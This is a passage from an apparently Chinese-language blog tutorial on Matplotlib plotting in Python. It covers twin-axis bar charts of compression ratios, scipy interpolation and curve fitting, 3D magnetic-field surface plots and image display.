class="number">50</span>, <span class="number">4000</span>, <span class="number">392_000</span>]</span><br><span class="line">single_dict = [<span class="number">185</span>, <span class="number">477</span>, <span class="number">508</span>]</span><br><span class="line"></span><br><span class="line">single_dict_ratio_in_comp = [single_dict[i] / (single_dict[i] + single[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">multi = [<span class="number">48</span>, <span class="number">3900</span>, <span class="number">383_000</span>]</span><br><span class="line">multi_dict = [<span class="number">212</span>, <span class="number">504</span>, <span class="number">528</span>]</span><br><span class="line"></span><br><span class="line">multi_dict_ratio_in_comp = [multi_dict[i] / (multi_dict[i] + multi[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">single_total_ratio = [(single[i] + single_dict[i]) / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line">multi_total_ratio = [(multi[i] + multi_dict[i]) / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line">axe2 = axe.twinx()</span><br><span class="line"></span><br><span class="line">axe.bar(x - width / <span class="number">2</span> - <span class="number">0.03</span>, single_dict_ratio_in_comp, width, color=<span class="string">&#x27;#56baf8&#x27;</span>, label=<span class="string">&quot;Single&quot;</span>)</span><br><span class="line">axe.bar(x + width / <span class="number">2</span> + <span class="number">0.03</span>, multi_dict_ratio_in_comp, width, color=<span class="string">&#x27;#f8566a&#x27;</span>, label=<span class="string">&quot;Multiple&quot;</span>)</span><br><span class="line"></span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line"></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;File Type&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Dictionary Size Ratio&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line">axe.set_yscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">axe.legend()</span><br><span class="line"></span><br><span class="line">axe2.scatter(x, single_total_ratio, c=<span class="string">&#x27;k&#x27;</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axe2.scatter(x, multi_total_ratio, c=<span class="string">&#x27;k&#x27;</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axe2.plot(x, single_total_ratio, <span class="string">&#x27;g--&#x27;</span>, label=<span class="string">&quot;Single in Total&quot;</span>)</span><br><span class="line">axe2.plot(x, multi_total_ratio, <span class="string">&#x27;y-&#x27;</span>, label=<span class="string">&quot;Multiple in Total&quot;</span>)</span><br><span class="line">axe2.legend(loc=(<span class="number">0.66</span>, <span class="number">0.7</span>))</span><br><span class="line"></span><br><span class="line">axe2.set_ylabel(<span class="string">&#x27;Total Compressed Ratio&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axe.set_title(<span class="string">&#x27;Dict Size Ratio &amp; Compressed Ratio Relationship&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/dict2.png" width="400px" /></p><h3 id="0-3-3-样条曲线和插值拟合"><a href="#0-3-3-样条曲线和插值拟合" class="headerlink" title="0.3.3 样条曲线和插值拟合"></a>0.3.3 样条曲线和插值拟合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: fit_interp_1d.py</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> interpolate</span><br><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> curve_fit</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Union</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Interpolate1DGen</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x: <span class="type">List</span>[<span class="built_in">float</span>], y: <span class="type">List</span>[<span class="built_in">float</span>], point_cnt: <span class="built_in">int</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.point_cnt = point_cnt</span><br><span class="line">        self.sorted_x = <span class="built_in">sorted</span>(self.x)</span><br><span class="line">        self.sorted_y = <span class="built_in">sorted</span>(self.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">interpolate_polynomial</span>(<span class="params">self, kind: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Polynomial interpolate for 1D data.</span></span><br><span class="line"><span class="string">        :param kind: &#x27;nearest&#x27;, &#x27;zero&#x27;, &#x27;linear&#x27;, &#x27;slinear&#x27;, &#x27;quadratic&#x27;(2), &#x27;cubic&#x27;(3), 4, 5, ...</span></span><br><span class="line"><span class="string">        :return: tuple(interpolated_x, interpolated_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ans_x = np.linspace(</span><br><span class="line">            self.sorted_x[<span class="number">0</span>],</span><br><span class="line">            self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>],</span><br><span class="line">            self.point_cnt</span><br><span class="line">        )</span><br><span class="line">        f_linear = interpolate.interp1d(</span><br><span class="line">            self.x, self.y, kind=kind</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> ans_x, f_linear(ans_x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">interpolate_B_spline</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        B-spline interpolate for 1D data.</span></span><br><span class="line"><span class="string">        **WARNING**: Data sort and non-duplicated will be needed.</span></span><br><span class="line"><span class="string">        :return: tuple(interpolated_x, interpolated_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ans_x = np.linspace(</span><br><span class="line">            self.sorted_x[<span class="number">0</span>],</span><br><span class="line">            self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>],</span><br><span class="line">            self.point_cnt</span><br><span class="line">        )</span><br><span class="line">        tck = interpolate.splrep(self.sorted_x, self.sorted_y)</span><br><span class="line">        y_bSpline = interpolate.splev(ans_x, tck)</span><br><span class="line">        <span class="keyword">return</span> ans_x, y_bSpline</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FitLine1DGen</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x: <span class="type">List</span>[<span class="built_in">float</span>], y: <span class="type">List</span>[<span class="built_in">float</span>], point_cnt: <span class="built_in">int</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.point_cnt = point_cnt</span><br><span class="line">        self.sorted_x = <span class="built_in">sorted</span>(self.x)</span><br><span class="line">        self.sorted_y = <span class="built_in">sorted</span>(self.y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S-shape curve fit.</span></span><br><span class="line">    <span class="comment"># Or logistic model.</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">x, lp, x0, k, b</span>):</span><br><span class="line">        y = lp / (<span class="number">1</span> + np.exp(-k * (x - x0))) + b</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit_polynomial_curve</span>(<span class="params">self, n: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Polynomial fitting for 1D data.</span></span><br><span class="line"><span class="string">        :param n: (int) the max power of the polynomial.</span></span><br><span class="line"><span class="string">        :return: tuple(fitting_curve_x, fitting_curve_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = np.polyfit(self.x, self.y, n)</span><br><span class="line">        ans_x = np.linspace(</span><br><span class="line">            self.sorted_x[<span class="number">0</span>],</span><br><span class="line">            self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>],</span><br><span class="line">            self.point_cnt</span><br><span class="line">        )</span><br><span class="line">        ans_y = np.polyval(params, ans_x)</span><br><span class="line">        <span class="keyword">return</span> ans_x, ans_y</span><br><span class="line"></span><br><span class="line">    <span class="comment"># logistic fit</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit_S_curve</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        S Curve fitting for 1D data.</span></span><br><span class="line"><span class="string">        :return: tuple(fitting_curve_x, fitting_curve_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># standardize data:</span></span><br><span class="line">        x_min = self.sorted_x[<span class="number">0</span>]</span><br><span class="line">        y_min = self.sorted_y[<span class="number">0</span>]</span><br><span class="line">        x_max = self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>]</span><br><span class="line">        y_max = self.sorted_y[<span class="built_in">len</span>(self.y)-<span class="number">1</span>]</span><br><span class="line">        x_zoomed = (np.array(self.x) - x_min) / (x_max - x_min)</span><br><span class="line">        y_zoomed = (np.array(self.y) - y_min) / (y_max - y_min)</span><br><span class="line">        <span class="comment"># A mandatory initial guess</span></span><br><span class="line">        <span class="comment"># [max(yData), median(xData), 1, min(yData)]</span></span><br><span class="line">        p_guess = [</span><br><span class="line">            <span class="built_in">max</span>(y_zoomed), np.median(x_zoomed),</span><br><span class="line">            <span class="number">1</span>, <span class="built_in">min</span>(y_zoomed)</span><br><span class="line">        ]</span><br><span class="line">        popt, pcov = curve_fit(</span><br><span class="line">            self.sigmoid, x_zoomed, y_zoomed,</span><br><span class="line">            p_guess</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[INFO] curve_fit: popt = &quot;</span>, popt)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[INFO] curve_fit: pcov = &quot;</span>, pcov)</span><br><span class="line"></span><br><span class="line">        fit_x = np.linspace(<span class="number">0</span>, <span class="number">1</span>, self.point_cnt)</span><br><span class="line">        fit_y = self.sigmoid(fit_x, popt[<span class="number">0</span>], popt[<span class="number">1</span>], popt[<span class="number">2</span>], popt[<span class="number">3</span>])</span><br><span class="line">        ans_x = fit_x * (x_max - x_min) + x_min</span><br><span class="line">        ans_y = fit_y * (y_max - y_min) + y_min</span><br><span class="line">        <span class="keyword">return</span> ans_x, ans_y</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fit_interp_1d <span class="keyword">import</span> Interpolate1DGen</span><br><span class="line"></span><br><span class="line">element_test_list = [<span class="number">50</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">500</span>, <span class="number">1000</span>]</span><br><span class="line">p_test_list = [<span class="number">1</span> / <span class="number">2</span>, <span class="number">1</span> / math.e, <span class="number">1</span> / <span class="number">4</span>, <span class="number">1</span> / <span class="number">8</span>, <span class="number">1</span> / <span class="number">16</span>]</span><br><span class="line">ans = [[<span class="number">8.75</span>, <span class="number">7.45</span>, <span class="number">5.48</span>, <span class="number">5.3</span>, <span class="number">4.92</span>],</span><br><span class="line">       [<span class="number">8.98</span>, <span class="number">7.67</span>, <span class="number">6.19</span>, <span class="number">5.58</span>, <span class="number">6.89</span>],</span><br><span class="line">       [<span class="number">9.72</span>, <span class="number">8.25</span>, <span class="number">6.35</span>, <span class="number">5.53</span>, <span class="number">10.33</span>],</span><br><span class="line">       [<span class="number">11.67</span>, <span class="number">9.22</span>, <span class="number">8.39</span>, <span class="number">8.81</span>, <span class="number">9.52</span>],</span><br><span class="line">       [<span class="number">12.83</span>, <span class="number">10.17</span>, <span class="number">8.56</span>, <span class="number">9.26</span>, <span class="number">10.71</span>]]</span><br><span class="line"></span><br><span class="line">style_list = [<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;-.&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;:&#x27;</span>]</span><br><span class="line">color_list = [<span class="string">&#x27;#04acf4&#x27;</span>, <span class="string">&#x27;#ff5722&#x27;</span>, <span class="string">&#x27;#ffeb3b&#x27;</span>, <span class="string">&#x27;#4caf50&#x27;</span>, <span class="string">&#x27;#9c27b0&#x27;</span>]</span><br><span class="line">inter_sample_cnt = <span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> idx, elem <span class="keyword">in</span> <span class="built_in">enumerate</span>(element_test_list):</span><br><span class="line">    aqd = ans[idx]</span><br><span class="line">    ans_p, ans_aqd = Interpolate1DGen(</span><br><span class="line">        p_test_list, aqd, inter_sample_cnt</span><br><span class="line">    ).interpolate_polynomial(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># plt.scatter(ans_p, ans_aqd, color=&#x27;k&#x27;, marker=&#x27;x&#x27;)</span></span><br><span class="line">    plt.plot(ans_p, ans_aqd, color=color_list[idx], linestyle=style_list[idx])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Probability $p$&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Average Query Distance (AQD)&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;The curves for AQD-probability&#x27;</span>)</span><br><span class="line">plt.minorticks_on()</span><br><span class="line">plt.grid()</span><br><span class="line">plt.legend(</span><br><span class="line">    labels=(</span><br><span class="line">        <span class="string">&#x27;element: 50&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 100&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 200&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 500&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 1000&#x27;</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/AQD_curves.png" width="400px" /></p><h3 id="0-3-4-3D-曲面"><a href="#0-3-4-3D-曲面" class="headerlink" title="0.3.4 3D 曲面"></a>0.3.4 3D 曲面</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu0 = <span class="number">4</span> * math.pi * <span class="number">10</span> ** (-<span class="number">3</span>)</span><br><span class="line">N = <span class="number">310</span></span><br><span class="line">R = <span class="number">0.14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i unit: A</span></span><br><span class="line"><span class="comment"># B unit: 1 Gauss = 10 ** -4 Tesla</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">I2B</span>(<span class="params">i: <span class="built_in">float</span>, x: <span class="built_in">float</span></span>):</span><br><span class="line">    p1 = mu0 * N * math.<span class="built_in">pow</span>(R, <span class="number">2</span>) * i /(<span class="number">2</span> * math.<span class="built_in">pow</span>(math.<span class="built_in">pow</span>(R, <span class="number">2</span>) + math.<span class="built_in">pow</span>(R / <span class="number">2</span> + x, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>))</span><br><span class="line">    p2 = mu0 * N * math.<span class="built_in">pow</span>(R, <span class="number">2</span>) * i /(<span class="number">2</span> * math.<span class="built_in">pow</span>(math.<span class="built_in">pow</span>(R, <span class="number">2</span>) + math.<span class="built_in">pow</span>(R / <span class="number">2</span> - x, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> p1 + p2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">theoB</span>(<span class="params">th_B0: <span class="built_in">float</span>, x: <span class="built_in">float</span></span>):</span><br><span class="line">    <span class="keyword">return</span> th_B0 * math.<span class="built_in">pow</span>(<span class="number">5</span>, <span class="number">3</span> / <span class="number">2</span>) / <span class="number">16</span> * (<span class="number">1</span> / math.<span class="built_in">pow</span>(<span class="number">1</span> + math.<span class="built_in">pow</span>(<span class="number">0.5</span> + x / R, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>) + <span class="number">1</span> / math.<span class="built_in">pow</span>(<span class="number">1</span> + math.<span class="built_in">pow</span>(<span class="number">0.5</span> - x / R, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p_cnt = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    axe = plt.axes(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">    plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span>  <span class="comment"># 用来正常显示负号</span></span><br><span class="line">    xx = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line">    yy = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">    mesh_val = [</span><br><span class="line">        [<span class="number">1.025</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.023</span>, <span class="number">1.020</span>, <span class="number">1.016</span>],  <span class="comment"># y = 0</span></span><br><span class="line">        [<span class="number">1.025</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.023</span>, <span class="number">1.020</span>, <span class="number">1.016</span>],  <span class="comment"># y = 0.05R</span></span><br><span class="line">        [<span class="number">1.024</span>, <span class="number">1.027</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.023</span>, <span class="number">1.022</span>, <span class="number">1.018</span>],  <span class="comment"># y = 0.10R</span></span><br><span class="line">        [<span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.025</span>, <span class="number">1.024</span>, <span class="number">1.021</span>],  <span class="comment"># y = 0.15R</span></span><br><span class="line">        [<span class="number">1.023</span>, <span class="number">1.023</span>, <span class="number">1.024</span>, <span class="number">1.025</span>, <span class="number">1.027</span>, <span class="number">1.026</span>, <span class="number">1.024</span>],  <span class="comment"># y = 0.20R</span></span><br><span class="line">        [<span class="number">1.021</span>, <span class="number">1.021</span>, <span class="number">1.023</span>, <span class="number">1.026</span>, <span class="number">1.028</span>, <span class="number">1.030</span>, <span class="number">1.030</span>],  <span class="comment"># y = 0.25R</span></span><br><span class="line">        [<span class="number">1.018</span>, <span class="number">1.019</span>, <span class="number">1.021</span>, <span class="number">1.027</span>, <span class="number">1.031</span>, <span class="number">1.033</span>, <span class="number">1.037</span>]   <span class="comment"># y = 0.30R</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">U2B</span>(<span class="params">u: <span class="built_in">float</span></span>):</span><br><span class="line">        <span class="keyword">return</span> (u - <span class="number">4.61538</span> * math.<span class="built_in">pow</span>(<span class="number">10</span>, -<span class="number">4</span>)) / <span class="number">0.25396</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Z_func</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">return</span> mesh_val[x][y]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mesh_val)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mesh_val[<span class="number">0</span>])):</span><br><span class="line">            mesh_val[i][j] = U2B(mesh_val[i][j])</span><br><span class="line"></span><br><span class="line">    rawX, rawY = np.meshgrid(xx, yy)</span><br><span class="line"></span><br><span class="line">    ap_all = np.vectorize(Z_func)</span><br><span class="line">    Z = ap_all(rawX, rawY)</span><br><span class="line">    <span class="built_in">print</span>(Z)</span><br><span class="line"></span><br><span class="line">    toReal = np.vectorize(<span class="keyword">lambda</span> x: x * <span class="number">0.05</span> * R)</span><br><span class="line">    rxx = toReal(xx)</span><br><span class="line">    ryy = toReal(yy)</span><br><span class="line">    X, Y = np.meshgrid(rxx, ryy)</span><br><span class="line"></span><br><span class="line">    axe.plot_surface(X, Y, Z, cmap=<span class="string">&#x27;jet&#x27;</span>)</span><br><span class="line">    axe.plot_wireframe(X, Y, Z, color=<span class="string">&#x27;k&#x27;</span>, linewidth=<span class="number">0.3</span>)</span><br><span class="line">    <span class="comment"># axe.minorticks_on()</span></span><br><span class="line">    axe.set_xlabel(<span class="string">&#x27;X position ($m$)&#x27;</span>)</span><br><span class="line">    axe.set_ylabel(<span class="string">&#x27;Y position ($m$)&#x27;</span>)</span><br><span class="line">    axe.set_zlabel(<span class="string">&#x27;Magnetic field density B ($G$)&#x27;</span>)</span><br><span class="line">    axe.set_title(<span class="string">&#x27;Space magnetic field distribution&#x27;</span>)</span><br><span class="line">    axe.grid(which=<span class="string">&quot;major&quot;</span>, alpha=<span class="number">0.6</span>)</span><br><span class="line">    axe.grid(which=<span class="string">&quot;minor&quot;</span>, alpha=<span class="number">0.3</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/AQD.png" width="400px" /></p><h3 id="0-3-5-输出图片"><a href="#0-3-5-输出图片" class="headerlink" title="0.3.5 输出图片"></a>0.3.5 输出图片</h3><p>除了使用 OpenCV 库的 <code>imshow</code>，Matplotlib 也支持输出图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> cv2 <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = imread(<span class="string">&#x27;assets/cat.jpg&#x27;</span>)</span><br><span class="line">img_tinted = img * [<span class="number">1</span>, <span class="number">0.95</span>, <span class="number">0.9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show the original image</span></span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show the tinted image</span></span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A slight gotcha with imshow is that it might give strange results</span></span><br><span class="line"><span class="comment"># if presented with data that is not uint8. To work around this, we</span></span><br><span class="line"><span class="comment"># explicitly cast the image to uint8 before displaying it.</span></span><br><span class="line">plt.imshow(np.uint8(img_tinted))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
